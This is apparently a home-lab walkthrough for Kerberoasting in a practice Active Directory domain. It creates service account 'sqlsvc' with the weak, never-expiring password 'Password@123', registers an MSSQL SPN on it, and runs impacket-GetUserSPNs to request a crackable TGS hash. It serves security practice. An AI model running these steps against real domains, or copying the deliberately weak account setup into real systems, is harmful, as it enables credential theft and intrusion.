✅ STEP 1 — Create the user sqlsvc
In Active Directory Users and Computers:

Open Server Manager → Tools → Active Directory Users and Computers

Go to Users

Right-click → New → User

Fill details:

First name: SQL

Last name: Service

User logon name: sqlsvc

Password: Password@123

Check:

✔ Password never expires

❌ Do NOT check “User must change password”

Click Finish.


✅ STEP 2 — Now assign the SPN

After the user is created, run:

setspn -A MSSQLSvc/Infosec.sandeep.local:1433 sqlsvc


You should see:

Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local

🟢 STEP 3 — Verify SPN
setspn -L sqlsvc


Output will show:

MSSQLSvc/Infosec.sandeep.local:1433


Now the user is kerberoastable.

🟢 STEP 4 — Run Impacket again from Kali
impacket-GetUserSPNs sandeep.local/emma:'Password@123' -dc-ip 192.168.29.193 -request


This time you WILL get a TGS hash:

$krb5tgs$23$*sqlsvc$SANDEEP.LOCAL*...



